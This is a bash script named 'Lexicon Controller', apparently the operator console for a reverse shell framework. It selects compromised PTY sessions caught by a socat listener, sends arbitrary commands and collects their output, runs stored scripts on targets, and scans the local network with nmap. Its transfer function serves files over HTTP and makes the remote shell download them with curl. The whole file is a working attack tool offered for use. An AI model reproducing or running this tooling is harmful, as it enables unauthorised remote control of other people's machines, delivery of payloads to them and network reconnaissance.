#!/usr/bin/env bash




# Lexicon Controller
# Interactive controller for Lexicon PTY reverse shell sessions
#
# Maintains session selection, command dispatch, and output collection.
#
# Sessions are created by the Lexicon socat listener and stored in:
# /opt/lexicon/sessions


BASE_DIR=/opt/lexicon/sessions

PER_READ_TIMEOUT=0.5
OVERALL_TIMEOUT=5


transfer(){
	if [ -z "$1" ]; then
		echo "Usage: /transfer <local_file_path>"
		return 1
	fi
	local_file="$1"
	SERVER_IP=$(ip route get 1.1.1.1 | awk '{print $7; exit}')

	if [ ! -f "$local_file" ]; then
		echo "File not found: $local_file"
		return 1
	fi

	filename=$(basename "$local_file")
	filedir=$(dirname "$local_file")

	cd "$filedir" || return 1
	python3 -m http.server 8181 --bind 0.0.0.0 > /tmp/lexicon_http_log.txt 2>&1 &
	SERVER_PID=$!
	echo "Started HTTP server with PID $SERVER_PID to serve $local_file"
	sleep 2 # give server time to start

	local payload="curl -O http://$SERVER_IP:8181/$filename"

	if [ -z "${PTYPATH:-}" ] || [ ! -e "$PTYPATH" ]; then
		echo "No PTYPATH selected or file doesn't exist."
		kill "$SERVER_PID"
		return 1
	fi

	# send payload to pty
	printf '%s\n' "$payload" > "$PTYPATH"
	# "Waiting for file transfer to complete..."
	sleep 5
	if grep -q "200" /tmp/lexicon_http_log.txt; then
		echo "Found a 200 OK!. File transfer complete."
	else
			echo "No 200 OK detected (may still be successful)"
	fi
	kill "$SERVER_PID"
	# rm /tmp/lexicon_http_log.txt



}

networkScan(){
	if ! command -v nmap >/dev/null; then
		echo "nmap not found, rerun the Lexicon installer or install nmap manually."
		echo " sudo apt install nmap"
		return 1
	fi

	interface=$(ip route get 1.1.1.1 | awk '{print $5; exit}')
	network=$(ip -o -f inet addr show "$interface" | awk '{print $4}')

	echo "Scanning network $network on interface $interface..."
	nmap -sn "$network"
	
}

scripts(){
	if [ -z "$1" ]; then
		echo -e "\nAvailable scripts:\n\n"
		for item in /opt/lexicon/scripts/*; do
			# check that folder exists and is not empty
			[ -e "$item" ] || continue

			if [ -f "$item" ]; then
				echo "$(basename "$item")"
			fi
		done
		echo "To run a script, use: /script <name>"
	else
		script_path="/opt/lexicon/scripts/$1"

		if [ ! -f "$script_path" ]; then
			echo "Script not found: $script_path"
			return 1
		fi
		if [ -z "${PTYPATH:-}" ] || [ ! -e "$PTYPATH" ]; then
			echo "No active sessions selected."
			return 1
		fi
		echo "Executing $script_path on session $PTYPATH"

		payload="bash -c '$(sed "s/'/'\\\\''/g" "$script_path")'"
		send_and_collect "$payload"
	fi
}

clear_sessions() {
  for f in "$BASE_DIR"/session-*; do
    [ -e "$f" ] || continue
    if [ ! -e "$(readlink -f "$f" 2>/dev/null)" ]; then
      echo "Removing stale session link: $f"
      rm -f "$f"
    fi
  done
}
send_and_collect(){
	local payload="$1"
	local per_read="$PER_READ_TIMEOUT"
	local overall="$OVERALL_TIMEOUT"
	local start now elapsed line

	# printf '\003' > "$PTYPATH" # Ctrl+C

	if [ -z "${PTYPATH:-}" ] || [ ! -e "$PTYPATH" ]; then
		echo "No PTYPATH selected or file doesn't exist."
		return 1
	fi

	# send payload to pty
	printf '%s\n' "$payload" > "$PTYPATH"

	# collect output until no more arrives for per_read, or overall timeout reached
	start=$(date +%s)
	echo "--- begin remote output ---"


	while true; do
		if read -r -t "$per_read" line < "$PTYPATH"; then
				printf 'REMOTE> %s\n' "$line"
					now=$(date +%s)
		elapsed=$(( now - start ))
		if (( elapsed >= overall )); then
			break
		fi
		continue
			else
					break
			fi
	done
	echo "--- end remote output ---"

}

kill_session() {
	if [ -z "${PTYPATH:-}" ] || [ ! -e "$PTYPATH" ]; then
		echo "No PTYPATH selected or file doesn't exist."
		return 1
	fi
	real_pty=$(readlink -f "$PTYPATH")
	echo "Killing session at $PTYPATH..."

	if command -v fuser >/dev/null; then
		fuser -k "$real_pty" 2>/dev/null || true
	else
		echo "fuser not found, attempting kill by finding process with open handle to $real_pty"
		pid=$(lsof -t "$real_pty" 2>/dev/null | head -n1)
		if [ -n "$pid" ]; then
			kill -9 "$pid"
			echo "Killed process $pid holding $real_pty"
		else
			echo "No process found holding $real_pty. It may have already exited."
		fi
	fi

	rm -f "$PTYPATH"
	echo "Session terminated"
}

list_sessions() {
	clear_sessions
	echo "Available Sessions (most recent first):"
	mapfile -t sessions < <(find "$BASE_DIR" -maxdepth 1 -name "session-*" -type l -printf "%T@ %p\n" 2>/dev/null | sort -nr | cut -d' ' -f2-)
	if [ ${#sessions[@]} -eq 0 ]; then
		echo " (No active sessions found in $BASE_DIR)"
		return 1
	fi
	local i=1
	for s in "${sessions[@]}"; do
		# show the resolved /dev/pts target and owner
		dev=$(readlink -f "$s" 2>/dev/null || echo "")
		owner=$( [ -n "$dev" ] && ls -l "$dev" 2>/dev/null | awk '{print $3":"$4}' || echo "")
		printf '  %d) %s -> %s (%s)\n' "$i" "$s" "$dev" "$owner"
		((i++))
	done
	return 0
}

choose_session() {
  # presents sessions and lets user pick one
  mapfile -t sessions < <(ls -1t "$BASE_DIR"/session-* 2>/dev/null || true)
  if [ ${#sessions[@]} -eq 0 ]; then
    echo "No sessions available."
    return 1
  fi
  while true; do
    list_sessions
    printf "Select session number (or 'r' to refresh, 'q' to quit): "
    read -r sel
    case "$sel" in
      q|Q) return 2 ;;
      r|R) continue ;;
      '' ) continue ;;
      *)
        if [[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -ge 1 ] && [ "$sel" -le "${#sessions[@]}" ]; then
          PTYPATH="${sessions[$((sel-1))]}"
          echo "Selected: $PTYPATH (resolves to $(readlink -f "$PTYPATH"))"
          return 0
        else
          echo "Invalid selection."
        fi
        ;;
    esac
  done
}

echo "Controller starting. PTY dir: $BASE_DIR"
if ! choose_session; then
	echo "No session chosen; exiting."
	exit 1
fi
echo "\n\nNow interacting with session:$PTYPATH"
echo -e "Commands:\n /send <text>\n /list (show sessions)\n /switch (choose another)\n /script [name]\n /kill (kill current session)\n /quit"

while read -r cmd; do
        case "$cmd" in
                /send\ *)
                        payload=${cmd#'/send '}
						# Handle dangerous commands with a timeout to prevent hanging the controller
						# pipe through head to batch output instead of flooding controller with many line outputs
						case "$payload" in
							ping*)
								target=${payload#ping }
								payload="ping -c 10 $target | head -n 50"
								;;
							top*|tail*|watch*)
								payload="timeout 5s $payload | head -n 50"
								;;
						esac
                        send_and_collect "$payload"
                        ;;
		/list)
			list_sessions
			;;
		/switch)
			if choose_session; then
				echo "Switched to $PTYPATH"
			else
				echo "Session switch cancelled."
			fi
			;;
		/script\ *)
			payload=${cmd#'/script '}
			scripts "$payload"
			;;
		/script)
			scripts
			;;
		/transfer\ *)
			payload=${cmd#'/transfer '}
			transfer "$payload"
			;;
		/transfer)
			transfer
			;;
		/quit)
			echo "bye"
			break
			;;
		/kill)
			read -p "Are you sure you want to kill the current session? Target will need to reconnect (y/N)" confirm
			if [[ "$confirm" =~ ^[Yy]$ ]]; then
				kill_session
			else
				echo "Kill cancelled."
			fi
			;;
		*)
			echo "Invalid command!"
			echo "commands: /send <text>, /read, /quit"
			;;
	esac
done
